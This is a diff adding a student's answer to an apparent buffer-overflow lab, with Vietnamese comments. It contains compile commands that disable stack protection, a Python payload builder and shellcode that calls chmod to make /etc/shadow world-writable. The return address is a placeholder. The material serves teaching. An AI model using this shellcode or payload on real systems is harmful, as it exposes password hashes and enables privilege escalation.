@@ -38,8 +38,41 @@ void main() {
   You are free to choose Code Injection or Environment Variable approach to do. 
 - Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
 **Answer 1**: Must conform to below structure:
+Biên dịch chương trình C
+gcc -o vulnerable_program vulnerable_program.c
+Biên dịch shellcode
+gcc -o shellcode shellcode.c -z execstack -fno-stack-protector
 
 Description text (optional)
+ Tạo payload để thực hiện tấn công
+ tạo payload bằng Python:
+
+import sys
+
+# Shellcode đã được cung cấp
+shellcode = (
+    "\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
+    "\x3a\x56\x81\xc6\x23\x45\x35\x21"
+    "\x89\x74\x24\xfc\xc7\x44\x24\xf8"
+    "\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
+    "\x2f\x65\x74\x63\x83\xec\x0c\x89"
+    "\xe3\x66\x68\xff\x01\x66\x59\xb0"
+    "\x0f\xcd\x80"
+)
+
+# Địa chỉ trả về giả định (cần điều chỉnh theo hệ thống của bạn)
+return_address = "\x90\x90\x90\x90"
+
+# Tạo payload
+payload = "A" * 16 + return_address + shellcode
+
+# Ghi payload vào file
+with open("payload", "wb") as f:
+    f.write(payload.encode('latin-1'))
+Thực hiện tấn công
+Chạy chương trình C với payload đã tạo:
+
+./vulnerable_program $(cat payload)
 
 
 ``` 
